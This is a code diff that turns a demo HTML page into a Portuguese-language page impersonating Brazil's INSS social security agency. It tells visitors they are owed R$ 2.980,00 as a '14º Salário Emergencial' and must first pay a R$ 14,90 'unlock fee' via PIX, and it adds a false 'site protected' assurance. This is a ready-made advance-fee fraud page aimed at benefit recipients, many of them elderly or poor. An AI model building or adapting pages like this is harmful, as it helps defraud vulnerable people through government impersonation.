@@ -1,37 +1,119 @@
-html
-Copiar código
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <title>Resultado</title>
-  <link rel="stylesheet" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta Benefício - Portal de Serviços</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: #004088;
+            color: white;
+            width: 100%;
+            max-width: 500px;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0px 10px 30px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .header-logo {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+            padding-bottom: 15px;
+        }
+        h1 {
+            font-size: 22px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        .result-box {
+            background-color: white;
+            color: #333;
+            padding: 25px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .amount {
+            color: #1d8032;
+            font-size: 32px;
+            font-weight: bold;
+            display: block;
+            margin: 10px 0;
+        }
+        .instruction {
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .btn-pix {
+            background-color: #ffcd07;
+            color: #004088;
+            text-decoration: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-weight: bold;
+            display: inline-block;
+            font-size: 18px;
+            transition: background 0.3s;
+        }
+        .btn-pix:hover {
+            background-color: #e6b800;
+        }
+        .footer-info {
+            font-size: 12px;
+            margin-top: 25px;
+            opacity: 0.8;
+        }
+        .tag-seguro {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            margin-top: 10px;
+        }
+    </style>
 </head>
 <body>
 
 <div class="container">
-  <div class="card">
+    <div class="header-logo">🏛️ INSS</div>
+    
+    <h1>Você tem direito a receber:</h1>
+    
+    <div class="result-box">
+        <span style="font-size: 16px;">Valor Calculado:</span>
+        <span class="amount">R$ 2.980,00</span>
+        <p style="font-size: 14px; font-weight: 500;">Referente ao 14º Salário Emergencial</p>
+    </div>
 
-    <h1>Acesso Gerado</h1>
-    <p class="subtitle">Escaneie o QR Code abaixo</p>
+    <p class="instruction">
+        Para finalizar a liberação e o envio do valor para sua conta, é necessário quitar a <strong>taxa de desbloqueio</strong> administrativa.
+    </p>
 
-    <div id="qrcode"></div>
+    <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 5px; margin-bottom: 20px;">
+        Taxa de Desbloqueio: <strong>R$ 14,90</strong>
+    </div>
 
-    <a href="index.html" class="btn secondary">Voltar</a>
+    <a href="#" class="btn-pix">PAGAR TAXA VIA PIX AGORA</a>
 
-    <p class="info">Conteúdo demonstrativo</p>
-
-  </div>
+    <div class="footer-info">
+        <div class="tag-seguro">
+            <span>🔒</span> Site protegido. Suas informações estão seguras conosco.
+        </div>
+        <p>© 2024 Portal de Serviços ao Segurado</p>
+    </div>
 </div>
-
-<script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script>
-<script>
-  new QRCode(document.getElementById("qrcode"), {
-    text: window.location.href,
-    width: 120,
-    height: 120
-  });
-</script>
 
 </body>
 </html>
